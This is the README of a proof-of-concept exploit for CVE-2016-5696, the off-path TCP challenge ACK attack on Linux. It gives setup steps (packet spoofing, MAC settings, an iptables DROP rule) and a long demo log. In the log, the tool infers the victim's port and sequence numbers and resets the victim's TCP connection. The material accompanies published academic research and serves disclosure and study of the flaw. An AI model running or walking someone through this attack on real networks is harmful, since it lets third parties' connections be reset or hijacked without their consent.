# Proof-of-concept code for CVE-2016-5696

This code currently allows reseting connections only. Injection is yet to be implemented.

For detailed information, consult the original publication:

[Off-Path TCP Exploits: Global Rate Limit Considered Dangerous](http://www.cs.ucr.edu/~zhiyunq/pub/sec16_TCP_pure_offpath.pdf)

# Requirements

1. You need to be able to spoof packets (no egress filtering).
2. You'll need to update *ROUTER_MAC* and *LOCAL_MAC* in *challack.c* with your spoof-ready machine's details.
2. You need to use iptables to DROP packets from the target host/port.  Otherwise, your legitimate TCP stack will interfere with this program's operation. You can do that by executing something like the following:

```
# iptables -A INPUT -j DROP -p tcp -s [server addr] --sport [server port]
```

# DEMO Session Excerpt

NOTE: The addresses have been changed to protect the innocent.

Attacker side:

```
# ./challack -a server.cve-2016-5696.org 80 client.cve-2016-5696.org
[*] Launching off-path challenge ACK attack against:
    server: 31.3.3.7:80
    client: 1.3.3.7 (port hint: 0)
    from: 3.13.3.7
[*] Selected local port: 15083
[*] Starting capture on "eth0" ...
[*] TCP Window size: 14600
[*] TCP handshake complete! Entering interactive session...
[*] Commencing attack...
[*] time-sync: round 1 - 108 challenge ACKs
[*] time-sync: round 2 - 109 challenge ACKs
[*] time-sync: round 3 - 100 challenge ACKs
[*] time-sync: round 4 - 100 challenge ACKs
[*] Time synchronization complete!
[*] tuple-infer: guessed port is in [32768 - 36768) (start: 32768): 100 challenge ACKs - NO
[*] tuple-infer: guessed port is in [36768 - 40768) (start: 36768):  99 challenge ACKs - OK
[*] tuple-infer: guessed port is in [38768 - 40768) (start: 36768): 100 challenge ACKs - NO
[*] tuple-infer: guessed port is in [37768 - 38768) (start: 36768): 100 challenge ACKs - NO
[*] tuple-infer: guessed port is in [37268 - 37768) (start: 36768):  99 challenge ACKs - OK
[*] tuple-infer: guessed port is in [37518 - 37768) (start: 37268): 100 challenge ACKs - NO
[*] tuple-infer: guessed port is in [37393 - 37518) (start: 37268): 100 challenge ACKs - NO
[*] tuple-infer: guessed port is in [37330 - 37393) (start: 37268):  99 challenge ACKs - OK
[*] tuple-infer: guessed port is in [37361 - 37393) (start: 37330):  99 challenge ACKs - OK
[*] tuple-infer: guessed port is in [37377 - 37393) (start: 37361): 100 challenge ACKs - NO
[*] tuple-infer: guessed port is in [37369 - 37377) (start: 37361):  99 challenge ACKs - OK
[*] tuple-infer: guessed port is in [37373 - 37377) (start: 37369):  99 challenge ACKs - OK
[*] tuple-infer: guessed port is in [37375 - 37377) (start: 37373): 100 challenge ACKs - NO
[*] tuple-infer: guessed port is in [37374 - 37375) (start: 37373): 100 challenge ACKs - NO
[*] tuple-infer: guessed port is in [37373 - 37374) (start: 37373):  99 challenge ACKs - OK
[*] Guessed client port (via binary search): 37373
[*] seq-infer: guessed seqs [00000000 - 06f63a00): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [06f63a00 - 0dec7400): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [0dec7400 - 14e2ae00): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [14e2ae00 - 1bd8e800): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [1bd8e800 - 22cf2200): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [22cf2200 - 29c55c00): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [29c55c00 - 30bb9600): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [30bb9600 - 37b1d000): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [37b1d000 - 3ea80a00): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [3ea80a00 - 459e4400): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [459e4400 - 4c947e00): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [4c947e00 - 538ab800): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [538ab800 - 5a80f200): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [5a80f200 - 61772c00): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [61772c00 - 686d6600): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [686d6600 - 6f63a000): 4000 packets,  99 challenge ACKs
[*] Narrowed sequence (1) to 1752000000 - 1868829200!
[*] seq-infer: guessed seqs [6be88300 - 6f63a000): 2000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6a2af480 - 6be88300): 1000 packets,  99 challenge ACKs
[*] seq-infer: guessed seqs [6b09bbc0 - 6be88300): 500 packets,  99 challenge ACKs
[*] seq-infer: guessed seqs [6b791f60 - 6be88300): 250 packets,  99 challenge ACKs
[*] seq-infer: guessed seqs [6bb0d130 - 6be88300): 125 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6b94bf40 - 6bb0d130): 63 packets,  99 challenge ACKs
[*] seq-infer: guessed seqs [6ba28f30 - 6bb0d130): 32 packets,  99 challenge ACKs
[*] seq-infer: guessed seqs [6ba9b030 - 6bb0d130): 16 packets,  99 challenge ACKs
[*] seq-infer: guessed seqs [6bad40b0 - 6bb0d130): 8 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6bab7870 - 6bad40b0): 4 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baa9450 - 6bab7870): 2 packets,  99 challenge ACKs
[*] seq-infer: guessed seqs [6bab0660 - 6bab7870): 1 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baa9450 - 6bab0660): 1 packets,  99 challenge ACKs
[*] Narrowed sequence (2) to: 1806341200 - 1806370400
[*] seq-infer: guessed seqs [6bab0660 - 6baafd00): 2400 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baafd00 - 6baaed60): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baaed60 - 6baaddc0): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baaddc0 - 6baace20): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baace20 - 6baabe80): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baabe80 - 6baaaee0): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baaaee0 - 6baa9f40): 4000 packets, 100 challenge ACKs
[*] seq-infer: guessed seqs [6baa9f40 - 6baa8fa0): 4000 packets,  98 challenge ACKs
[*] seq-infer: guessed seqs [6baa8fa0 - 6baa8000): 4000 packets,  98 challenge ACKs
[*] seq-infer: guessed seqs [6baa8000 - 6baa7060): 4000 packets,  98 challenge ACKs
[*] seq-infer: guessed seqs [6baa7060 - 6baa60c0): 4000 packets,  98 challenge ACKs
[*] seq-infer: guessed seqs [6baa60c0 - 6baa5120): 4000 packets,  98 challenge ACKs
[*] seq-infer: guessed seqs [6baa5120 - 6baa4180): 4000 packets,  98 challenge ACKs
[*] seq-infer: guessed seqs [6baa4180 - 6baa31e0): 4000 packets,  98 challenge ACKs
[*] seq-infer: guessed seqs [6baa31e0 - 6baa2240): 4000 packets,  99 challenge ACKs
[!] Exhausted sequence number search (2)...
```

Victim side:

```
$ ./client server.cve-2016-5696.org 80
[*] connected from port 37373 to server.cve-2016-5696.org:80 on sd 3
    sending request...
    read 251 bytes of data in 0 39221 seconds
    slept 59 148 seconds.
    sending request...
    read 251 bytes of data in 0 27517 seconds
    slept 59 330 seconds.
    sending request...
read: Connection reset by peer
[...]
```
